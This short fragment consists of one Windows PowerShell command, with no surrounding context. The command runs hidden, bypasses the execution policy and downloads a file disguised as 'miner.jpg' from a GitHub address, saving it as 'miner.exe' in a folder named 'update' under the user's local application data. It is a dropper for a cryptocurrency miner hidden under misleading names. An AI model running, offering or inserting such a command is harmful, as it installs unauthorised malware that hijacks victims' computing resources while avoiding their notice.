...
powershell.exe -NoP -NonI -W Hidden -Force -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/miner.jpg ',\"$env:LOCALAPPDATA\update\miner.exe\")
